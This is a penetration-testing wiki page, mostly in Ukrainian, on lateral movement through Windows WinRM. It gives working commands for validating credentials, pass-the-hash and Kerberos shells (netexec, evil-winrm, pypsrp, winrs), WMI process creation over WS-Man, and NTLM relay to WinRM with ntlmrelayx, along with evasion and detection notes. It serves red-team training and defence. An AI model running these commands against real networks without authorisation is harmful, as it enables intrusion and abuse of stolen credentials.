# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM є одним із найзручніших транспорту для **lateral movement** у Windows-середовищах, тому що він дає вам віддалену shell через **WS-Man/HTTP(S)** без потреби в трюках зі створенням SMB service. Якщо ціль відкриває **5985/5986** і ваш principal має право використовувати remoting, ви часто можете дуже швидко перейти від "valid creds" до "interactive shell".

Для **protocol/service enumeration**, listeners, увімкнення WinRM, `Invoke-Command` і загального використання client, дивіться:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Чому operators люблять WinRM

- Використовує **HTTP/HTTPS** замість SMB/RPC, тому часто працює там, де execution у стилі PsExec заблоковано.
- З **Kerberos** не надсилає reusable credentials на ціль.
- Працює коректно з tooling для **Windows**, **Linux** і **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Інтерактивний PowerShell remoting path запускає **`wsmprovhost.exe`** на цілі в контексті authenticated user, що operationally відрізняється від service-based exec.

## Модель доступу та prerequisites

На практиці успішний WinRM lateral movement залежить від **трьох** речей:

1. На цілі є **WinRM listener** (`5985`/`5986`) і firewall rules, які дозволяють доступ.
2. Обліковий запис може **authenticate** до endpoint.
3. Обліковий запис має право **open a remoting session**.

Поширені способи отримати цей доступ:

- **Local Administrator** на цілі.
- Membership у **Remote Management Users** на новіших системах або **WinRMRemoteWMIUsers__** на системах/компонентах, які все ще враховують цю group.
- Явно делеговані remoting rights через local security descriptors / зміни PowerShell remoting ACL.

Якщо ви вже контролюєте box з admin правами, пам’ятайте, що також можна **delegate WinRM access without full admin group membership** за допомогою технік, описаних тут:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas, які мають значення під час lateral movement

- **Kerberos вимагає hostname/FQDN**. Якщо підключатися по IP, client зазвичай переключається на **NTLM/Negotiate**.
- У **workgroup** або в cross-trust edge cases NTLM зазвичай вимагає або **HTTPS**, або щоб target було додано до **TrustedHosts** на client.
- Для **local accounts** через Negotiate у workgroup UAC remote restrictions можуть заблокувати доступ, якщо не використовується вбудований Administrator account або не встановлено `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting за замовчуванням використовує SPN **`HTTP/<host>`**. У середовищах, де **`HTTP/<host>`** уже зареєстрований за іншим service account, WinRM Kerberos може завершуватися помилкою `0x80090322`; використайте port-qualified SPN або перейдіть на **`WSMAN/<host>`**, де існує цей SPN.

Якщо ви отримали valid credentials під час password spraying, перевірка їх через WinRM часто є найшвидшим способом дізнатися, чи дають вони shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec для validation і one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM для інтерактивних shell

`evil-winrm` залишається найзручнішим інтерактивним варіантом з Linux, оскільки підтримує **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, передавання файлів і завантаження PowerShell/.NET в пам’ять.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Коли стандартний **`HTTP/<host>`** SPN спричиняє збої Kerberos, спробуйте запитати/використати замість нього квиток **`WSMAN/<host>`**. Це трапляється в hardened або дивних enterprise-налаштуваннях, де **`HTTP/<host>`** уже прив’язаний до іншого service account.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Це також корисно після зловживання **RBCD / S4U**, коли ви спеціально forged або requested **WSMAN** service ticket замість generic `HTTP` ticket.

### Authentication на основі certificate

WinRM також підтримує **client certificate authentication**, але certificate має бути mapped на target до **local account**. З offensive perspective це важливо, коли:

- ви вже вкрали/exported valid client certificate і private key, які вже mapped для WinRM;
- ви зловживали **AD CS / Pass-the-Certificate** щоб отримати certificate для principal, а потім pivot into another authentication path;
- ви працюєте в environments, які навмисно уникають password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM є набагато менш поширеним, ніж password/hash/Kerberos auth, але коли він існує, він може забезпечити шлях **passwordless lateral movement**, який переживає rotation пароля.

### Python / automation with `pypsrp`

If you need automation rather than an operator shell, `pypsrp` gives you WinRM/PSRP from Python with **NTLM**, **certificate auth**, **Kerberos**, and **CredSSP** support.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Якщо тобі потрібен тонкіший контроль, ніж у високорівневого wrapper `Client`, нижчорівневі API `WSMan` + `RunspacePool` корисні для двох поширених задач operator:

- примусово використовувати **`WSMAN`** як Kerberos service/SPN замість стандартного `HTTP`, який очікують багато PowerShell clients;
- підключатися до **non-default PSRP endpoint**, наприклад **JEA** / custom session configuration, замість `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Custom PSRP endpoints and JEA matter during lateral movement

Успішна автентифікація WinRM **не завжди** означає, що ви потрапите в endpoint `Microsoft.PowerShell` за замовчуванням без обмежень. У зрілих середовищах можуть бути доступні **custom session configurations** або **JEA** endpoints зі своїми ACLs і поведінкою run-as.

Якщо у вас уже є code execution на Windows host і ви хочете зрозуміти, які remoting surfaces існують, перелічіть зареєстровані endpoints:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Коли існує корисний endpoint, цільтеся в нього явно замість default shell:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Практичні наступальні наслідки:

- **Обмежена** endpoint усе ще може бути достатньою для lateral movement, якщо вона експонує саме ті cmdlets/functions, що потрібні для керування службами, доступу до файлів, створення процесів або довільного виконання .NET / зовнішніх команд.
- **Неправильно налаштована JEA** role особливо цінна, коли вона експонує небезпечні команди, такі як `Start-Process`, широкі wildcard-и, writable providers або custom proxy functions, які дозволяють обійти заплановані обмеження.
- Endpoints, що базуються на **RunAs virtual accounts** або **gMSAs**, змінюють effective security context команд, які ви запускаєте. Зокрема, endpoint на основі gMSA може надати **network identity на second hop** навіть тоді, коли звичайна WinRM session зіткнулася б із класичною проблемою delegation.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` вбудований і корисний, коли вам потрібне **native WinRM command execution** без відкриття interactive PowerShell remoting session:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Два прапорці легко забути, але на практиці вони важливі:

- `/noprofile` часто потрібен, коли віддалений principal **не** є локальним адміністратором.
- `/allowdelegate` дозволяє віддаленій shell використовувати ваші credentials проти **третього хоста** (наприклад, коли команді потрібен `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Оперативно, `winrs.exe` зазвичай призводить до ланцюжка віддалених процесів, схожого на:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Це варто запам’ятати, оскільки це відрізняється від service-based exec і від interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM замість PowerShell remoting

Ви також можете виконувати через **WinRM transport** без `Enter-PSSession`, викликаючи WMI classes через WS-Man. Це зберігає transport як WinRM, тоді як primitive віддаленого виконання стає **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Такий підхід корисний, коли:

- PowerShell logging сильно моніториться.
- Вам потрібен **WinRM transport**, але не класичний PS remoting workflow.
- Ви створюєте або використовуєте custom tooling навколо **`WSMan.Automation`** COM object.

## NTLM relay to WinRM (WS-Man)

Коли SMB relay заблоковано signing і LDAP relay обмежено, **WS-Man/WinRM** все ще може бути привабливою relay target. Сучасний `ntlmrelayx.py` включає **WinRM relay servers** і може relay до **`wsman://`** або **`winrms://`** targets.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Два практичні зауваження:

- Relay найкорисніший, коли ціль приймає **NTLM** і relayed principal має право використовувати WinRM.
- Останній код Impacket спеціально обробляє запити **`WSMANIDENTIFY: unauthenticated`**, тож перевірки у стилі `Test-WSMan` не ламають relay flow.

Для обмежень multi-hop після отримання першої WinRM session дивіться:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC і нотатки щодо detection

- **Interactive PowerShell remoting** зазвичай створює **`wsmprovhost.exe`** на цілі.
- **`winrs.exe`** зазвичай створює **`winrshost.exe`**, а потім запитаний child process.
- Custom **JEA** endpoints можуть виконувати дії як **`WinRM_VA_*`** virtual accounts або як налаштований **gMSA**, що змінює як telemetry, так і second-hop behavior порівняно зі звичайним shell у user-context.
- Очікуйте telemetry **network logon**, події WinRM service та PowerShell operational/script-block logging, якщо ви використовуєте PSRP замість raw `cmd.exe`.
- Якщо вам потрібна лише одна команда, `winrs.exe` або одноразове WinRM execution може бути тихішим за довготривалу interactive remoting session.
- Якщо Kerberos доступний, віддавайте перевагу **FQDN + Kerberos** замість IP + NTLM, щоб зменшити як trust issues, так і незручні зміни `TrustedHosts` на стороні клієнта.

## References

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
